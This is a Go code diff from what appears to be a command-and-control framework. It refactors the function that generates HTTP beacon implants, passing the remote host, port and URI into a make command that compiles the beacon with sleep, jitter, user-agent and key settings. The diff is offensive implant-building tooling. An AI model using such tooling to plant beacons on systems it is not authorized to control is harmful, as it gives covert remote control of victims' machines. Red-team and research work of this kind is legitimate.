@@ -86,6 +86,7 @@ func SpawnHTTP(c *grumble.Context) error {
 		Sleep:     sleep,
 		Jitter:    jitter,
 		Listener:  listener,
+		RHOST:     RHOST,
 		UserAgent: useragent,
 		GOOS:      opsys,
 		GOARCH:    arch,
@@ -97,6 +98,12 @@ func SpawnHTTP(c *grumble.Context) error {
 	}
 	os.WriteFile(fmt.Sprintf(version.BEACON_DATA_DIR+"%s.yaml", name), yamlData, 0666)
 
+	spawnHTTP(path, listener, RHOST, sleep, jitter, opsys, arch, useragent, key, name, c, RPORT, URI)
+
+	return nil
+}
+
+func spawnHTTP(path string, listener string, rhost string, sleep int, jitter int, opsys string, arch string, useragent string, key []byte, name string, c *grumble.Context, rport string, uri string) {
 	// build beacon
 	if opsys == "windows" {
 		name += ".exe"
@@ -117,9 +124,7 @@ func SpawnHTTP(c *grumble.Context) error {
 	sKeyC := strconv.FormatUint(nKeyC, 10)
 	sKeyD := strconv.FormatUint(nKeyD, 10)
 
-	hellsgopher.CmdReturn(fmt.Sprintf("make -C ./agent/http/%s/ BEACON_NAME=%s KEYA=\"%s\" KEYB=\"%s\" KEYC=\"%s\" KEYD=\"%s\" sSLEEP=%d sJITTER=%d RHOST=%s RPORT=%s LISTENER_NAME=%s USERAGENT=%s URI=%s BINARY_NAME=%s cGOOS=%s cGOARCH=%s SPAWN_PATH=%s", opsys, name, sKeyA, sKeyB, sKeyC, sKeyD, sleep, jitter, RHOST, RPORT, listener, useragent, URI, name, opsys, arch, path))
+	hellsgopher.CmdReturn(fmt.Sprintf("make -C ./agent/http/%s/ BEACON_NAME=%s KEYA=\"%s\" KEYB=\"%s\" KEYC=\"%s\" KEYD=\"%s\" sSLEEP=%d sJITTER=%d RHOST=%s RPORT=%s LISTENER_NAME=%s USERAGENT=%s URI=%s BINARY_NAME=%s cGOOS=%s cGOARCH=%s SPAWN_PATH=%s", opsys, name, sKeyA, sKeyB, sKeyC, sKeyD, sleep, jitter, rhost, rport, listener, useragent, uri, name, opsys, arch, path))
 
 	logging.Okay(fmt.Sprintf("Successfully generated beacon (%s)", name), c)
-
-	return nil
 }
